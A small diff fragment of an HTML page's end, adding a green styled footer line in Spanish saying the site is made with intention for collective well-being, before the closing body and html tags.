+    <p style="margin-top:10px;color:#81c784;font-size:12px;">🌿 Hecho con intención para el bienestar colectivo</p>
   </footer>
+
 </body>
 </html>
